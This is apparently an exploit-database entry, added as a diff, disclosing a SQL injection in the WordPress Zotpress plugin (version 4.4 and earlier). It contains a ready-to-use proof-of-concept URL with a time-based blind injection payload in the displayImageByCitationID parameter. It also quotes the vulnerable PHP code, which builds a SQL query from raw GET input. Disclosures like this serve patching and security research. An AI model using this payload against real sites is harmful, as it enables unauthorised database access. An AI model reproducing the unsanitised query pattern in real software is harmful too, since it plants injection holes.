@@ -1,0 +1,47 @@
+# Exploit Title: WordPress Zotpress plugin <= 4.4 SQL Injection Vulnerability
+# Date: 2011-09-04
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/zotpress.4.4.zip
+# Version: 4.4 (tested)
+# Note: magic_quotes has to be turned off
+
+---
+PoC
+---
+http://www.site.com/wp-content/plugins/zotpress/zotpress.rss.php?api_user_id=1&account_type=test&displayImages=true&displayImageByCitationID=-1' AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)%23
+
+---------------
+Vulnerable code
+---------------
+if ($mzr_api_user_id == false
+	&& $mzr_include == false
+	&& (isset($_GET['api_user_id']) && preg_match("/^[0-9]+$/", $_GET['api_user_id'])))
+{
+	$mzr_api_user_id = trim($_GET['api_user_id']);
+}
+...
+if ($mzr_account_type == false
+	&& $mzr_include == false
+	&& (isset($_GET['account_type']) && preg_match("/^[a-zA-Z]+$/", $_GET['account_type'])))
+{
+	$mzr_account_type = trim($_GET['account_type']);
+}
+...
+if ($mzr_displayImages == false
+	&& $mzr_include == false
+	&& (isset($_GET['displayImages']) && preg_match("/^[a-zA-Z]+$/", $_GET['displayImages'])))
+{
+	$zp_update_db_shortcode_request .= "image='".$_GET['displayImages']."', ";
+	
+	if ($_GET['displayImages'] == "true")
+		$mzr_displayImages = true;
+	else
+		$mzr_displayImages = false;
+}
+...
+if (isset($mzr_account_type) && isset($mzr_api_user_id))
+{
+	if ($mzr_displayImages == true)
+	{
+		if (isset($_GET['displayImageByCitationID']))
+			$images = $wpdb->get_results("SELECT * FROM ".$wpdb->prefix."zotpress_images WHERE citation_id='".trim($_GET['displayImageByCitationID'])."'");
